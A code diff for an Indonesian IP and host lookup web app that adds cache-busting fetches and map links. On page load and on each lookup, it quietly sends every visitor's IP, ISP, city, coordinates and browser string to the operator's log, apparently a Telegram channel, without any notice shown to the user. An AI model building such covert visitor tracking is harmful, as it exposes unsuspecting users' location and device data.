@@ -337,9 +337,14 @@
       const codePoints = countryCode.toUpperCase().split('').map(char =>  127397 + char.charCodeAt());
       return String.fromCodePoint(...codePoints);
     }
-    // FETCH HELPER ANTI-CACHE
+    
+    // --- FORCE FRESH FETCH (ANTI-CACHE) ---
+    // Fungsi ini menambahkan timestamp ?_={waktu} ke setiap request
+    // untuk memaksa browser mengambil data baru (Bypass Cache VPN)
     const fetchFresh = async (url) => {
-      const res = await fetch(url, { cache: 'reload', headers: {'Cache-Control': 'no-cache'} });
+      const separator = url.includes('?') ? '&' : '?';
+      const freshUrl = `${url}${separator}_=${new Date().getTime()}`;
+      const res = await fetch(freshUrl, { cache: 'reload', headers: {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'} });
       return res.json();
     }
 
@@ -433,28 +438,33 @@
       }
     });
 
-    // 2. CEK MY IP
+    // 2. CEK MY IP (ANTI-CACHE REVISION)
     document.getElementById('btnMyIP').addEventListener('click', async () => {
-        showLoading("GETTING FRESH IP...");
+        showLoading("DETECTING VPN...");
         try {
-            // Gunakan ipwho.is dengan anti-cache untuk deteksi VPN real-time
+            // Menggunakan fetchFresh agar tidak mengambil data cache browser
             const d = await fetchFresh('https://ipwho.is/');
+            
             if(!d.success) throw new Error(d.message || "Gagal");
 
             renderIpResult(d, "MY IP ADDRESS");
             showResult('ip');
             
+            // Detail Notif
             const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
+            const mapLink = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            
             const tgMsg = `<b>🕵️‍♂️ AKTIVITAS PENGGUNA</b>\n` +
-                          `• Pelaku: <code>${d.ip}</code>\n` + // Pelaku = IP yg baru di-fetch (VPN)
+                          `• Pelaku (Real-Time): <code>${d.ip}</code>\n` +
                           `• Action: <b>🔍 CEK IP SENDIRI</b>\n` +
                           `• ISP: ${isp}\n` +
-                          `• Lokasi: ${d.city}, ${d.country} ${flag}`;
+                          `• Lokasi: ${d.city}, ${d.country} ${flag}\n` +
+                          `• Koordinat: <a href="${mapLink}">Buka Peta 🗺️</a>`;
             
             sendLog(tgMsg, 'IP_CHECK');
         } catch (e) {
-            showError("Gagal Cek IP: " + e.message);
+            showError("Gagal Cek IP. Coba matikan AdBlock/DNS Pribadi.");
         }
     });
 
@@ -467,13 +477,13 @@
     // 4. CEK HOST ACTION
     document.getElementById('btnCheckHostAction').addEventListener('click', async () => {
         let host = document.getElementById('hostInput').value.trim();
-        host = host.replace(/^https?:\/\//, '').replace(/\/.*$/, ''); // Clean URL
+        host = host.replace(/^https?:\/\//, '').replace(/\/.*$/, ''); 
 
         if(!host) return alert("Masukkan Host/Domain!");
 
         showLoading(`RESOLVING: ${host}`);
         try {
-            // Resolve via Google DNS
+            // Resolve IP via Google DNS (Selalu akurat)
             let targetIP = host;
             const isIP = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(host);
             if(!isIP) {
@@ -485,25 +495,28 @@
                targetIP = record.data;
             }
 
-            // Get Geo Data
+            // Get Geo Data (Fresh)
             const d = await fetchFresh(`https://ipwho.is/${targetIP}`); 
             if(!d.success) throw new Error(d.message || "Gagal mengambil data Geo");
 
             renderIpResult(d, `HOST: ${host}`);
             showResult('ip');
             
-            // DETAIL NOTIF TELEGRAM
+            // DETAIL NOTIF
             const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
+            const mapLink = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+
             const tgMsg = `<b>🕵️‍♂️ AKTIVITAS PENGGUNA</b>\n` +
-                          `• Pelaku: <code>${visitorIP}</code>\n` +
+                          `• Pelaku (IP Anda): <code>${visitorIP}</code>\n` +
                           `• Action: <b>📡 CEK HOST</b>\n` +
                           `• Target: <code>${host}</code>\n\n` +
                           `<b>✅ HASIL RESOLVE</b>\n` +
                           `• Real IP: <code>${d.ip}</code>\n` +
                           `• ISP: ${isp}\n` +
                           `• Negara: ${d.country} ${flag}\n` +
-                          `• Kota: ${d.city}`;
+                          `• Kota: ${d.city}\n` +
+                          `• Maps: <a href="${mapLink}">Lihat Lokasi</a>`;
             
             sendLog(tgMsg, 'IP_HOST_CHECK');
         } catch (e) {
@@ -523,6 +536,7 @@
         const region = d.region;
         const timezone = d.timezone ? d.timezone.id : "-";
         const flag = getFlagEmoji(code);
+        const mapUrl = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
         let html = `
             <div class="grid grid-cols-1 gap-2">
@@ -540,9 +554,16 @@
                         <span class="text-white text-lg">${flag} <span class="text-sm font-bold align-middle ml-1">${country}</span></span>
                      </div>
                 </div>
-                <div class="bg-black/40 p-2 rounded border border-white/5">
-                    <span class="text-gray-500 text-[10px] block">LOKASI / KOTA</span>
-                    <span class="text-white">${city}, ${region}</span>
+                <div class="grid grid-cols-2 gap-2">
+                   <div class="bg-black/40 p-2 rounded border border-white/5">
+                      <span class="text-gray-500 text-[10px] block">LOKASI / KOTA</span>
+                      <span class="text-white">${city}, ${region}</span>
+                   </div>
+                   <div class="bg-black/40 p-2 rounded border border-white/5 flex items-center justify-center">
+                      <a href="${mapUrl}" target="_blank" class="text-cyber-cyan text-xs font-bold border border-cyber-cyan px-2 py-1 rounded hover:bg-cyber-cyan hover:text-black transition-colors">
+                        <i class="fa-solid fa-map-location-dot mr-1"></i> BUKA PETA
+                      </a>
+                   </div>
                 </div>
                  <div class="bg-black/40 p-2 rounded border border-white/5">
                     <span class="text-gray-500 text-[10px] block">TIMEZONE</span>
@@ -564,7 +585,7 @@
       }
     });
 
-    // --- PWA & VISITOR (UPDATE: DETAILED VISITOR LOG) ---
+    // --- PWA & DETAILED VISITOR LOG ---
     let deferredPrompt;
     const installModal = document.getElementById('installModal');
     const installBtn = document.getElementById('installBtn');
@@ -574,32 +595,35 @@
     installBtn.addEventListener('click', async () => { if (deferredPrompt) { deferredPrompt.prompt(); const { outcome } = await deferredPrompt.userChoice; if (outcome === 'accepted') installModal.classList.add('hidden'); deferredPrompt = null; } });
     closeInstall.addEventListener('click', () => installModal.classList.add('hidden'));
     
-    // FETCH VISITOR INFO (DETAILED) ON LOAD
+    // FETCH DETAILED VISITOR INFO ON LOAD
     window.addEventListener('load', async () => { 
         try { 
-            // Menggunakan ipwho.is untuk detail lengkap pengunjung di awal
+            // Menggunakan ipwho.is dengan parameter random untuk menghindari cache awal
             const d = await fetchFresh('https://ipwho.is/');
-            if(!d.success) throw new Error("Fail");
+            if(!d.success) throw new Error("Gagal IP");
 
-            visitorIP = d.ip; // Set Global IP
+            visitorIP = d.ip; // Simpan IP Global
 
             const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
-            const logVisitor = `<b>👤 PENGUNJUNG BARU</b>\n` +
+            const mapLink = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            
+            const logVisitor = `<b>👤 PENGUNJUNG BARU (DETAIL)</b>\n` +
                                `━━━━━━━━━━━━━━━━━━\n` +
                                `• IP: <code>${d.ip}</code>\n` +
                                `• ISP: ${isp}\n` +
                                `• Lokasi: ${d.city}, ${d.country} ${flag}\n` +
-                               `• Device: ${navigator.userAgent}`;
+                               `• Koordinat: <a href="${mapLink}">Lihat Peta</a>\n` +
+                               `• Browser: <i>${navigator.userAgent}</i>`;
             
             sendLog(logVisitor, 'VISITOR'); 
         } catch (e) {
-            // Fallback jika ipwhois gagal (biar tetap ada log)
+            // Fallback ringan jika ipwhois gagal total (jarang terjadi)
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 visitorIP = d.ip;
-                sendLog(`<b>👤 PENGUNJUNG BARU (Simple)</b>\n• IP: ${d.ip}`, 'VISITOR');
+                sendLog(`<b>👤 PENGUNJUNG BARU</b>\n• IP: ${d.ip}`, 'VISITOR');
             } catch(ex){}
         } 
     });
